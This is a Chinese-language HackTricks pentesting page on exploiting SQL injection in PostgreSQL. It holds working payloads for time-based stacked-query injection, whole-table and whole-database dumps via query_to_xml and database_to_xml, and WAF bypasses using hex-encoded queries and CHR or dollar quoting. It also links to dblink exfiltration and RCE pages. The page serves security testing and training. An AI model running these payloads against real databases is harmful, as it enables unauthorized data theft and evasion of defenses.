# PostgreSQL 注入

{{#include ../../../banners/hacktricks-training.md}}

---

**本页面旨在解释不同的技巧，这些技巧可以帮助您利用在 PostgreSQL 数据库中发现的 SQL 注入，并补充您可以在** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) **找到的技巧。**

## 网络交互 - 权限提升、端口扫描、NTLM 挑战响应泄露与外泄

**PostgreSQL 模块 `dblink`** 提供了连接到其他 PostgreSQL 实例和执行 TCP 连接的能力。这些功能与 `COPY FROM` 功能相结合，使得权限提升、端口扫描和 NTLM 挑战响应捕获等操作成为可能。有关执行这些攻击的详细方法，请查看如何 [执行这些攻击](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md)。

### **使用 dblink 和大对象的外泄示例**

您可以 [**阅读此示例**](dblink-lo_import-data-exfiltration.md) 以查看一个 CTF 示例，**如何将数据加载到大对象中，然后在函数 `dblink_connect` 的用户名中外泄大对象的内容。**

## PostgreSQL 攻击：读/写、RCE、权限提升

请查看如何从 PostgreSQL 破坏主机并提升权限：

{{#ref}}
../../../network-services-pentesting/pentesting-postgresql.md
{{#endref}}

## WAF 绕过

### PostgreSQL 字符串函数

操纵字符串可以帮助您 **绕过 WAF 或其他限制**。\
[**在此页面**](https://www.postgresqltutorial.com/postgresql-string-functions/) **您可以找到一些有用的字符串函数。**

### 堆叠查询

请记住，PostgreSQL 支持堆叠查询，但如果在期望仅返回 1 个响应时返回 2 个响应，许多应用程序将抛出错误。但是，您仍然可以通过时间注入滥用堆叠查询：
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### XML技巧

**query_to_xml**

此函数将以XML格式返回所有数据，仅在一个文件中。如果您想在一行中转储大量数据，这非常理想：
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database_to_xml**

此函数将整个数据库以 XML 格式转储为仅 1 行（如果数据库非常大，请小心，因为您可能会导致 DoS 或甚至影响您自己的客户端）：
```sql
SELECT database_to_xml(true,true,'');
```
### Hex中的字符串

如果您可以运行**查询**并将其**放在字符串中**（例如使用**`query_to_xml`**函数）。**您可以使用convert_from将字符串作为十六进制传递，从而以这种方式绕过过滤器：**
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
### 禁止的引号

如果无法为您的有效负载使用引号，您可以通过 `CHR` 绕过此限制，适用于基本子句（_字符连接仅适用于基本查询，例如 SELECT、INSERT、DELETE 等。它不适用于所有 SQL 语句_）：
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
或者使用 `$`。这两个查询返回相同的结果：
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
{{#include ../../../banners/hacktricks-training.md}}
